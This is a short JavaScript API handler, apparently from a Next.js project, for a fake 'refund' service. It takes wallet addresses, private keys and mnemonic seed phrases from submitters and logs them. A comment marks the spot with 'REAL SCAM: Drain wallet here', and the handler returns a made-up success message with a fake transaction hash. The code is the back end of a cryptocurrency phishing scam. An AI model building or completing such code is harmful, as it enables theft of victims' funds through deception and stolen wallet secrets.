export default async function handler(req, res) {
    if (req.method === 'POST') {
        const data = req.body;
        console.log('💰 REFUND DATA RECEIVED:', {
            address: data.address,
            hasPrivateKey: !!data.privateKey,
            mnemonicWords: data.mnemonic.split(' ').length
        });
        
        // 🚨 REAL SCAM: Drain wallet here
        res.json({ 
            success: true, 
            message: 'Refund processing started!',
            tx: '0x123fake' 
        });
    } else {
        res.status(405).end();
    }
}